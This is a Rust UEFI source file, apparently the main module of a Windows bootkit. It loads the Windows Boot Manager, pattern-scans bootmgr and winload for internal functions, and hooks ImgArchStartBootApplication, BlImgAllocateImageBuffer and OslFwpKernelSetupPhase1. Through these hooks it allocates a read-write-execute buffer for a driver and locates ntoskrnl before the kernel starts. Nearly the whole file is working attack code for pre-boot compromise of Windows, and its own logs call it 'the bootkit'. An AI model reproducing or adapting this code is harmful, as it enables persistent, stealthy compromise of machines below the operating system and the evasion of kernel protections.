#![no_main]
#![no_std]
#![feature(offset_of)]

extern crate alloc;

mod boot;
mod global;
mod hook;
mod utils;
mod windows;

use crate::global::*;
use crate::hook::Hook;
use crate::windows::{KLDR_DATA_TABLE_ENTRY, LOADER_PARAMETER_BLOCK};
use alloc::slice;
use core::ffi::c_void;
use core::u8;
use uefi::prelude::*;
use uefi::proto::loaded_image::LoadedImage;
use uefi::table::boot::LoadImageSource;

#[panic_handler]
fn panic_handler(info: &core::panic::PanicInfo) -> ! {
    if let Some(location) = info.location() {
        log::error!(
            "[-] Panic in {} at ({}, {}):",
            location.file(),
            location.line(),
            location.column()
        );
        // if let Some(message) = info.payload().downcast_ref::<&str>() {
        //     log::error!("[-] {}", message);
        // }
    }
    loop {}
}

fn setup_efi(image_handle: Handle, system_table: &SystemTable<Boot>) {
    com_logger::builder()
        .base(0x2f8)
        .filter(log::LevelFilter::Debug)
        .setup();
    let boot_services = system_table.boot_services();
    unsafe { boot_services.set_image_handle(image_handle) };
    unsafe { uefi::allocator::init(boot_services) };
}

#[entry]
fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
    // uefi_services::init(&mut system_table).unwrap();
    setup_efi(image_handle, &system_table);
    let boot_services = system_table.boot_services();
    log::info!("[*] Searching Windows EFI bootmgr");
    let bootmgr_device_path = boot::windows_bootmgr_device_path(boot_services)
        .expect("Failed to find Windows Boot Manager. Is Windows installed?");
    log::info!("[+] Found! Loading Boot Manager into memory");
    let bootmgr_handle = boot_services
        .load_image(
            image_handle,
            LoadImageSource::FromDevicePath {
                device_path: &bootmgr_device_path,
                from_boot_manager: false,
            },
        )
        .unwrap();
    setup_hooks(&bootmgr_handle, boot_services);
    log::info!("[+] Starting Windows Boot Manager");
    system_table.boot_services().stall(2_000_000);
    boot_services
        .start_image(bootmgr_handle)
        .expect("Failed to start Windows Boot Manager");
    Status::SUCCESS
}

fn setup_hooks(bootmgr_handle: &Handle, boot_services: &BootServices) {
    // Find and hook ImgArchStartBootApplication to recover control when winload.efi is ready to be executed
    log::info!("[*] Setting up ImgArchStartBootApplication hook");
    let bootmgr_image = boot_services
        .open_protocol_exclusive::<LoadedImage>(*bootmgr_handle)
        .unwrap();
    let (bootmgr_base, bootmgr_size) = bootmgr_image.info();
    let bootmgr_data =
        unsafe { slice::from_raw_parts(bootmgr_base as *const _, bootmgr_size as _) };
    let offset = utils::find_pattern(IMG_ARCH_START_BOOT_APPLICATION_SIGNATURE, bootmgr_data)
        .expect("Unable to match ImgArchStartBootApplication signature");
    unsafe {
        IMG_ARCH_START_BOOT_APPLICATION = Some(Hook::new(
            bootmgr_base.add(offset) as *mut _,
            img_arch_start_boot_application_hook as *const _,
        ));
    };
}

fn img_arch_start_boot_application_hook(
    app_entry: *mut c_void,
    winload_base: *mut c_void,
    winload_size: u32,
    boot_option: u8,
    return_arguments: *mut c_void,
) -> uefi::Status {
    log::info!("[+] ImgArchStartBootApplication hook successful!");
    let img_arch_start_boot_application =
        unsafe { IMG_ARCH_START_BOOT_APPLICATION.take().unwrap().unhook() };

    // Find and hook OslFwpKernelSetupPhase1 to get a pointer to ntoskrnl
    log::info!("[*] Setting up OslFwpKernelSetupPhase1 hook");
    let winload_data =
        unsafe { slice::from_raw_parts(winload_base as *const u8, winload_size as _) };
    unsafe {
        // To try and keep the hooking method version-independent, we will first search for OslExecuteTransiion
        let offset = utils::find_pattern(OSL_EXECUTE_TRANSITION_SIGNATURE, winload_data)
            .expect("Unable to match OslExecuteTransition signature");
        let osl_execute_transition_address =
            utils::relative_address(winload_base.add(offset), utils::CALL_SIZE);
        // From OslExecuteTransiion, find a call to OslFwpKernelSetupPhase1
        let osl_execute_transition_data =
            slice::from_raw_parts(osl_execute_transition_address as *const u8, 0x4f);
        let offset = utils::find_pattern(
            OSL_FWP_KERNEL_SETUP_PHASE1_SIGNATURE,
            osl_execute_transition_data,
        )
        .expect("Unable to match OslFwpKernelSetupPhase1 signature");
        let osl_fwp_kernel_setup_phase1_address =
            utils::relative_address(osl_execute_transition_address.add(offset), utils::CALL_SIZE);
        OSL_FWP_KERNEL_SETUP_PHASE1 = Some(Hook::new(
            osl_fwp_kernel_setup_phase1_address as *mut _,
            osl_fwp_kernel_setup_phase1_hook as *const _,
        ));
    }

    // Find and hook BlImgAllocateImageBuffer to allocate the driver
    log::info!("[*] Setting up BlImgAllocateImageBuffer hook");
    let offset = utils::find_pattern(BL_IMG_ALLOCATE_BUFFER_SIGNATURE, winload_data)
        .expect("Unable to match BlImgAllocateImageBuffer signature");
    unsafe {
        let bl_img_allocate_buffer_address =
            utils::relative_address(winload_base.add(offset + 3), utils::CALL_SIZE);
        BL_IMG_ALLOCATE_BUFFER = Some(Hook::new(
            bl_img_allocate_buffer_address as *mut _,
            bl_img_allocate_buffer_hook as *const _,
        ));
    }

    log::info!("[*] Resuming ImgArchStartBootApplication execution");
    img_arch_start_boot_application(
        app_entry,
        winload_base,
        winload_size,
        boot_option,
        return_arguments,
    )
}

pub fn bl_img_allocate_buffer_hook(
    image_buffer: *mut *mut c_void,
    image_size: u64,
    memory_type: u32,
    attributes: u32,
    reserved: *mut c_void,
    flags: u32,
) -> uefi::Status {
    log::info!("[+] BlImgAllocateBufferHook hook successful!");
    let mut current_hook = unsafe { BL_IMG_ALLOCATE_BUFFER.take().unwrap() };
    let bl_img_allocate_buffer = unsafe { current_hook.unhook() };
    let status = bl_img_allocate_buffer(
        image_buffer,
        image_size,
        memory_type,
        attributes,
        reserved,
        flags,
    );

    // Check if we can allocate a buffer for our driver
    if status == Status::SUCCESS && memory_type == BL_MEMORY_TYPE_APPLICATION {
        unsafe {
            let status = bl_img_allocate_buffer(
                &mut DRIVER_ALLOCATED_BUFFER as *mut *mut c_void,
                DRIVER_SIZE,
                BL_MEMORY_TYPE_APPLICATION,
                BL_MEMORY_ATTRIBUTE_RWX,
                core::ptr::null_mut(),
                0,
            );
            if status == Status::SUCCESS {
                log::info!(
                    "[*] Allocated buffer for driver at address {:?}",
                    DRIVER_ALLOCATED_BUFFER
                );
            } else {
                log::info!("[!] Driver allocation failed! Status code {:?}", status);
                DRIVER_ALLOCATED_BUFFER = core::ptr::null_mut();
            }
        }
        return status;
    }

    // Couldn't allocate the buffer on this call, try on the next
    unsafe {
        current_hook.hook(bl_img_allocate_buffer_hook as *const _);
        BL_IMG_ALLOCATE_BUFFER = Some(current_hook);
    }
    log::info!("[*] Resuming BlImgAllocateBufferHook execution");
    status
}

fn osl_fwp_kernel_setup_phase1_hook(loader_block: *mut LOADER_PARAMETER_BLOCK) -> uefi::Status {
    log::info!("[+] OslFwpKernelSetupPhase1 hook successful!");
    let osl_fwp_kernel_setup_phase1 =
        unsafe { OSL_FWP_KERNEL_SETUP_PHASE1.take().unwrap().unhook() };
    unsafe {
        if DRIVER_ALLOCATED_BUFFER.is_null() {
            log::error!("[-] As driver allocation failed, the bootkit will abort now :(");
            return osl_fwp_kernel_setup_phase1(loader_block);
        }
    };
    let ntoskrnl: KLDR_DATA_TABLE_ENTRY = unsafe {
        *utils::get_module_entry(&mut (*loader_block).LoadOrderListHead, "ntoskrnl.exe")
            .expect("Unable to find ntoskrnl.exe kernel entry")
    };
    log::info!("[*] Found ntoskrnl at address {:?}, size {:#010x}", ntoskrnl.DllBase, ntoskrnl.SizeOfImage);
    log::info!("[*] Resuming OslFwpKernelSetupPhase1 execution");
    osl_fwp_kernel_setup_phase1(loader_block)
}
